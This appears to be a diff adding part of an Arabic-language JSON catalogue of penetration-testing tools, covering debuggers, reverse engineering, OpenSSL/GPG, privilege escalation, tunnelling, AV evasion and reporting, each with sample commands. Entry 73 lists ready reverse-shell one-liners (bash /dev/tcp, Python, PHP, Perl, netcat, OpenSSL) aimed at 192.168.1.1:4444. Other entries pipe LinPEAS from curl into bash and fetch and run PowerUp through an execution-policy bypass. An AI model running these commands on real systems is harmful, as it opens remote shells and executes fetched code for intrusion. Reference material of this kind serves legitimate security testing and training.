+    "description": "المصحح القياسي لنظام Linux مع إمكانيات هندسة عكسية",
+    "tags": ["debug", "تصحيح", "تحليل"],
+    "commands": [
+      { "title": "تشغيل برنامج", "cmd": "gdb ./binary" },
+      { "title": "فحص التجمع", "cmd": "disassemble main" },
+      { "title": "نقاط التوقف", "cmd": "break *0x08048456" },
+      { "title": "تشغيل", "cmd": "run" },
+      { "title": "الخطوة التالية", "cmd": "stepi" },
+      { "title": "فحص السجلات", "cmd": "info registers" },
+      { "title": "فحص الذاكرة", "cmd": "x/20x $esp" },
+      { "title": "مع GEF", "cmd": "gef ./binary" },
+      { "title": "مع pwndbg", "cmd": "pwndbg ./binary" }
+    ]
+  },
+  {
+    "id": 62,
+    "name": "radare2",
+    "category": "reverse",
+    "categoryName": "الهندسة العكسية",
+    "catIcon": "fa-code",
+    "catColor": 9,
+    "os": "cross",
+    "description": "إطار عمل متقدم للهندسة العكسية وتحليل الثنائيات",
+    "tags": ["تحليل", "disassemble", "ثنائيات"],
+    "commands": [
+      { "title": "فتح ملف", "cmd": "r2 binary" },
+      { "title": "تحليل تلقائي", "cmd": "r2 -AA binary" },
+      { "title": "عرض المعلومات", "cmd": "r2 -qq -c \"ii\" binary" },
+      { "title": "Disassemble main", "cmd": "r2 -c \"aaa; pdf @ main\" binary" },
+      { "title": "قائمة الدوال", "cmd": "r2 -c \"afl\" binary" },
+      { "title": "Hex dump", "cmd": "r2 -c \"px 256\" binary" },
+      { "title": "البحث عن سلاسل", "cmd": "r2 -c \"iz\" binary" }
+    ]
+  },
+  {
+    "id": 63,
+    "name": "Objdump",
+    "category": "reverse",
+    "categoryName": "الهندسة العكسية",
+    "catIcon": "fa-code",
+    "catColor": 9,
+    "os": "linux",
+    "description": "أداة GNU لعرض محتوى الملفات التنفيذية",
+    "tags": ["disassemble", "تنفيذي", "GNU"],
+    "commands": [
+      { "title": "Disassemble كامل", "cmd": "objdump -d binary" },
+      { "title": "مع تعليمات Intel", "cmd": "objdump -d -M intel binary" },
+      { "title": "عرض الأقسام", "cmd": "objdump -h binary" },
+      { "title": "عرض الرموز", "cmd": "objdump -t binary" },
+      { "title": "Disassemble قسم محدد", "cmd": "objdump -d -j .text binary" }
+    ]
+  },
+  {
+    "id": 64,
+    "name": "strace",
+    "category": "reverse",
+    "categoryName": "الهندسة العكسية",
+    "catIcon": "fa-code",
+    "catColor": 9,
+    "os": "linux",
+    "description": "تتبع استدعاءات النظام system calls لبرنامج ما",
+    "tags": ["system calls", "تتبع", "تحليل"],
+    "commands": [
+      { "title": "تتبع برنامج", "cmd": "strace ./binary" },
+      { "title": "تتبع عملية قيد التشغيل", "cmd": "strace -p 1234" },
+      { "title": "تتبع مكالمات الشبكة", "cmd": "strace -e trace=network ./binary" },
+      { "title": "تتبع قراءة وكتابة الملفات", "cmd": "strace -e trace=file ./binary" },
+      { "title": "حفظ المخرجات", "cmd": "strace -o trace.log ./binary" },
+      { "title": "مع وقت التنفيذ", "cmd": "strace -T ./binary" }
+    ]
+  },
+  {
+    "id": 65,
+    "name": "ltrace",
+    "category": "reverse",
+    "categoryName": "الهندسة العكسية",
+    "catIcon": "fa-code",
+    "catColor": 9,
+    "os": "linux",
+    "description": "تتبع مكالمات المكتبات library calls لبرنامج ما",
+    "tags": ["library calls", "تتبع", "تحليل"],
+    "commands": [
+      { "title": "تتبع مكالمات المكتبات", "cmd": "ltrace ./binary" },
+      { "title": "تتبع عملية قيد التشغيل", "cmd": "ltrace -p 1234" },
+      { "title": "تتبع دالة محددة", "cmd": "ltrace -e strcpy ./binary" },
+      { "title": "حفظ المخرجات", "cmd": "ltrace -o output.log ./binary" }
+    ]
+  },
+  {
+    "id": 66,
+    "name": "OpenSSL",
+    "category": "crypto",
+    "categoryName": "التشفير",
+    "catIcon": "fa-lock",
+    "catColor": 10,
+    "os": "cross",
+    "description": "مجموعة أدوات التشفير الأشهر لـ SSL/TLS وعمليات التشفير العامة",
+    "tags": ["SSL", "TLS", "شهادات", "تشفير"],
+    "commands": [
+      { "title": "فحص شهادة SSL", "cmd": "openssl s_client -connect example.com:443" },
+      { "title": "شهادة نصية", "cmd": "openssl s_client -connect example.com:443 | openssl x509 -text -noout" },
+      { "title": "تشفير AES-256", "cmd": "openssl enc -aes-256-cbc -salt -in file.txt -out file.enc" },
+      { "title": "فك تشفير", "cmd": "openssl enc -aes-256-cbc -d -in file.enc -out file.txt" },
+      { "title": "تجزئة MD5", "cmd": "openssl md5 file.txt" },
+      { "title": "تجزئة SHA-256", "cmd": "openssl sha256 file.txt" },
+      { "title": "إنشاء مفتاح RSA", "cmd": "openssl genrsa -out private.key 2048" },
+      { "title": "استخراج المفتاح العام", "cmd": "openssl rsa -in private.key -pubout -out public.key" },
+      { "title": "إنشاء CSR", "cmd": "openssl req -new -key private.key -out request.csr" },
+      { "title": "صلاحية الشهادة", "cmd": "openssl x509 -in cert.pem -noout -dates" },
+      { "title": "PEM إلى DER", "cmd": "openssl x509 -in cert.pem -outform DER -out cert.der" },
+      { "title": "التحقق من سلسلة الشهادات", "cmd": "openssl verify -CAfile ca.pem cert.pem" },
+      { "title": "شهادة ذاتية التوقيع", "cmd": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365" }
+    ]
+  },
+  {
+    "id": 67,
+    "name": "GPG",
+    "category": "crypto",
+    "categoryName": "التشفير",
+    "catIcon": "fa-lock",
+    "catColor": 10,
+    "os": "cross",
+    "description": "GNU Privacy Guard لتشفير وتوقيع الملفات وإدارة المفاتيح",
+    "tags": ["تشفير", "توقيع", "مفاتيح"],
+    "commands": [
+      { "title": "إنشاء زوج مفاتيح", "cmd": "gpg --full-generate-key" },
+      { "title": "تشفير ملف", "cmd": "gpg -e -r recipient@example.com file.txt" },
+      { "title": "فك تشفير ملف", "cmd": "gpg -d file.txt.gpg" },
+      { "title": "توقيع ملف", "cmd": "gpg --sign file.txt" },
+      { "title": "التحقق من التوقيع", "cmd": "gpg --verify file.txt.gpg" },
+      { "title": "استيراد مفتاح عام", "cmd": "gpg --import public.key" },
+      { "title": "تصدير المفتاح العام", "cmd": "gpg --export --armor your@email.com > public.asc" },
+      { "title": "قائمة المفاتيح", "cmd": "gpg --list-keys" }
+    ]
+  },
+  {
+    "id": 68,
+    "name": "Hash-Identifier",
+    "category": "crypto",
+    "categoryName": "التشفير",
+    "catIcon": "fa-lock",
+    "catColor": 10,
+    "os": "linux",
+    "description": "تحديد نوع التجزئة من الـ hash",
+    "tags": ["تجزئة", "تحديد", "تحليل"],
+    "commands": [
+      { "title": "تشغيل الأداة", "cmd": "hash-identifier" },
+      { "title": "إدخال hash يدويا", "cmd": "hash-identifier\n# الصق الـ hash واضغط Enter" }
+    ]
+  },
+  {
+    "id": 69,
+    "name": "LinPEAS",
+    "category": "privesc",
+    "categoryName": "تصعيد الصلاحيات",
+    "catIcon": "fa-arrow-up",
+    "catColor": 11,
+    "os": "linux",
+    "description": "سكريبت شامل للبحث عن مسارات تصعيد الصلاحيات على Linux",
+    "tags": ["Linux", "تصعيد", "فحص"],
+    "commands": [
+      { "title": "تشغيل محلي", "cmd": "./linpeas.sh" },
+      { "title": "عبر curl", "cmd": "curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash" },
+      { "title": "حفظ المخرجات", "cmd": "./linpeas.sh | tee linpeas_output.txt" },
+      { "title": "وضع صامت", "cmd": "./linpeas.sh -q" }
+    ]
+  },
+  {
+    "id": 70,
+    "name": "WinPEAS",
+    "category": "privesc",
+    "categoryName": "تصعيد الصلاحيات",
+    "catIcon": "fa-arrow-up",
+    "catColor": 11,
+    "os": "windows",
+    "description": "سكريبت شامل للبحث عن مسارات تصعيد الصلاحيات على Windows",
+    "tags": ["Windows", "تصعيد", "فحص"],
+    "commands": [
+      { "title": "تشغيل", "cmd": "winPEASx64.exe" },
+      { "title": "فحص سريع", "cmd": "winPEASx64.exe fast" },
+      { "title": "فحص محدد", "cmd": "winPEASx64.exe servicesinfo" },
+      { "title": "حفظ النتائج", "cmd": "winPEASx64.exe > output.txt" }
+    ]
+  },
+  {
+    "id": 71,
+    "name": "Linux Exploit Suggester",
+    "category": "privesc",
+    "categoryName": "تصعيد الصلاحيات",
+    "catIcon": "fa-arrow-up",
+    "catColor": 11,
+    "os": "linux",
+    "description": "اقتراح استغلالات لتصعيد الصلاحيات بناء على إصدار النواة",
+    "tags": ["Linux", "نواة", "استغلال"],
+    "commands": [
+      { "title": "تشغيل", "cmd": "./linux-exploit-suggester.sh" },
+      { "title": "تحديد إصدار النواة", "cmd": "./linux-exploit-suggester.sh --uname \"3.10.0\"" },
+      { "title": "مع كشف تلقائي", "cmd": "./linux-exploit-suggester.sh --kernel 3.10.0" }
+    ]
+  },
+  {
+    "id": 72,
+    "name": "PowerUp",
+    "category": "privesc",
+    "categoryName": "تصعيد الصلاحيات",
+    "catIcon": "fa-arrow-up",
+    "catColor": 11,
+    "os": "windows",
+    "description": "سكريبت PowerShell للبحث عن مسارات تصعيد الصلاحيات",
+    "tags": ["Windows", "PowerShell", "تصعيد"],
+    "commands": [
+      { "title": "تشغيل كامل", "cmd": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/PowerUp.ps1'); Invoke-AllChecks\"" },
+      { "title": "فحص الخدمات", "cmd": "Get-ServiceUnquoted" },
+      { "title": "فحص مسارات التسجيل", "cmd": "Get-ModifiableRegistryAutoRun" }
+    ]
+  },
+  {
+    "id": 73,
+    "name": "Reverse Shells Collection",
+    "category": "post",
+    "categoryName": "ما بعد الاستغلال",
+    "catIcon": "fa-terminal",
+    "catColor": 12,
+    "os": "cross",
+    "description": "مجموعة أوامر Reverse Shell بجميع اللغات",
+    "tags": ["reverse shell", "اتصال عكسي", "وصول عن بعد"],
+    "commands": [
+      { "title": "Bash Reverse Shell", "cmd": "bash -i >& /dev/tcp/192.168.1.1/4444 0>&1" },
+      { "title": "Python Reverse Shell", "cmd": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
+      { "title": "PHP Reverse Shell", "cmd": "php -r '$sock=fsockopen(\"192.168.1.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
+      { "title": "Perl Reverse Shell", "cmd": "perl -e 'use Socket;$i=\"192.168.1.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" },
+      { "title": "Netcat Reverse Shell", "cmd": "nc -e /bin/bash 192.168.1.1 4444" },
+      { "title": "OpenSSL Reverse Shell", "cmd": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.1:4444 > /tmp/s; rm /tmp/s" },
+      { "title": "المستمع المهاجم", "cmd": "nc -lvp 4444" },
+      { "title": "المستمع مع SSL", "cmd": "openssl s_server -quiet -listen 4444" }
+    ]
+  },
+  {
+    "id": 74,
+    "name": "Chisel",
+    "category": "post",
+    "categoryName": "ما بعد الاستغلال",
+    "catIcon": "fa-terminal",
+    "catColor": 12,
+    "os": "cross",
+    "description": "نفق TCP/UDP سريع عبر HTTP مع دعم SOCKS",
+    "tags": ["نفق", "SOCKS", "proxy", "TCP"],
+    "commands": [
+      { "title": "خادم النفق", "cmd": "chisel server --reverse -p 8080" },
+      { "title": "عميل SOCKS", "cmd": "chisel client 192.168.1.1:8080 R:socks" },
+      { "title": "نفق منفذ محلي", "cmd": "chisel client 192.168.1.1:8080 R:8080:127.0.0.1:80" },
+      { "title": "نفق UDP", "cmd": "chisel client 192.168.1.1:8080 R:53/udp:127.0.0.1:53" }
+    ]
+  },
+  {
+    "id": 75,
+    "name": "Ligolo-ng",
+    "category": "post",
+    "categoryName": "ما بعد الاستغلال",
+    "catIcon": "fa-terminal",
+    "catColor": 12,
+    "os": "cross",
+    "description": "أداة نفقing متقدمة تعتمد على TUN interfaces",
+    "tags": ["نفق", "TUN", "متقدم"],
+    "commands": [
+      { "title": "خادم", "cmd": "./proxy -selfcert" },
+      { "title": "عميل", "cmd": "./agent -connect 192.168.1.1:11601 -ignore-cert" },
+      { "title": "إنشاء واجهة TUN", "cmd": "interface_start --tun 10.10.10.1/24" }
+    ]
+  },
+  {
+    "id": 76,
+    "name": "PsExec",
+    "category": "post",
+    "categoryName": "ما بعد الاستغلال",
+    "catIcon": "fa-terminal",
+    "catColor": 12,
+    "os": "windows",
+    "description": "تنفيذ أوامر عن بعد على أجهزة Windows",
+    "tags": ["Windows", "تنفيذ عن بعد", "Sysinternals"],
+    "commands": [
+      { "title": "تنفيذ أمر عن بعد", "cmd": "psexec \\\\192.168.1.1 -u admin -p pass cmd.exe" },
+      { "title": "نسخ وتنفيذ", "cmd": "psexec \\\\192.168.1.1 -u admin -p pass -c program.exe" },
+      { "title": "تنفيذ كـ SYSTEM", "cmd": "psexec \\\\192.168.1.1 -s cmd.exe" }
+    ]
+  },
+  {
+    "id": 77,
+    "name": "Veil-Evasion",
+    "category": "evasion",
+    "categoryName": "التحايل على الحماية",
+    "catIcon": "fa-ghost",
+    "catColor": 13,
+    "os": "linux",
+    "description": "إطار عمل لتوليد payloads تتجنب مضادات الفيروسات",
+    "tags": ["AV evasion", "payload", "توليد"],
+    "commands": [
+      { "title": "تشغيل Veil", "cmd": "veil" },
+      { "title": "قائمة Payloads", "cmd": "list" },
+      { "title": "اختيار Payload", "cmd": "use 1" },
+      { "title": "تعيين LHOST", "cmd": "set LHOST 192.168.1.100" },
+      { "title": "توليد", "cmd": "generate" }
+    ]
+  },
+  {
+    "id": 78,
+    "name": "Shellter",
+    "category": "evasion",
+    "categoryName": "التحايل على الحماية",
+    "catIcon": "fa-ghost",
+    "catColor": 13,
+    "os": "linux",
+    "description": "تشفير payload داخل ملف تنفيذي شرعي لتجنب الكشف",
+    "tags": ["AV evasion", "حقن", "تشفير"],
+    "commands": [
+      { "title": "تشغيل Shellter", "cmd": "shellter" },
+      { "title": "وضع تلقائي", "cmd": "# اختر: Auto" },
+      { "title": "وضع يدوي", "cmd": "# اختر: Manual" }
+    ]
+  },
+  {
+    "id": 79,
+    "name": "TheFatRat",
+    "category": "evasion",
+    "categoryName": "التحايل على الحماية",
+    "catIcon": "fa-ghost",
+    "catColor": 13,
+    "os": "linux",
+    "description": "أداة لتوليد backdoors تتجنب معظم مضادات الفيروسات",
+    "tags": ["backdoor", "AV evasion", "توليد"],
+    "commands": [
+      { "title": "تشغيل", "cmd": "fatrat" },
+      { "title": "اختيار payload", "cmd": "# اتبع القائمة التفاعلية" }
+    ]
+  },
+  {
+    "id": 80,
+    "name": "Dradis",
+    "category": "reporting",
+    "categoryName": "التقارير والتوثيق",
+    "catIcon": "fa-file-lines",
+    "catColor": 14,
+    "os": "cross",
+    "description": "منصة لتجميع وتنظيم نتائج اختبار الاختراق في تقرير واحد",
+    "tags": ["تقارير", "تنظيم", "تعاون"],
+    "commands": [
+      { "title": "تشغيل الخادم", "cmd": "dradis-pro start" },
+      { "title": "الواجهة", "cmd": "http://localhost:3000" }
+    ]
+  },
+  {
+    "id": 81,
+    "name": "CherryTree",
+    "category": "reporting",
+    "categoryName": "التقارير والتوثيق",
+    "catIcon": "fa-file-lines",
+    "catColor": 14,
+    "os": "cross",
+    "description": "برنامج تدوين شجري مفيد لتوثيق مراحل الاختبار",
+    "tags": ["توثيق", "ملاحظات", "شجري"],
+    "commands": [
+      { "title": "تشغيل", "cmd": "cherrytree" },
+      { "title": "فتح ملف", "cmd": "cherrytree notes.ctd" }
+    ]
+  },
+  {
+    "id": 82,
+    "name": "Pandoc Reports",
+    "category": "reporting",
+    "categoryName": "التقارير والتوثيق",
+    "catIcon": "fa-file-lines",
+    "catColor": 14,
+    "os": "cross",
+    "description": "تحويل تقارير Markdown إلى PDF احترافية",
+    "tags": ["قوالب", "LaTeX", "تقارير"],
+    "commands": [
+      { "title": "Markdown إلى PDF", "cmd": "pandoc report.md -o report.pdf --pdf-engine=xelatex" },
+      { "title": "Markdown إلى HTML", "cmd": "pandoc report.md -o report.html --standalone" },
+      { "title": "Markdown إلى DOCX", "cmd": "pandoc report.md -o report.docx" }
+    ]
+  }
+]
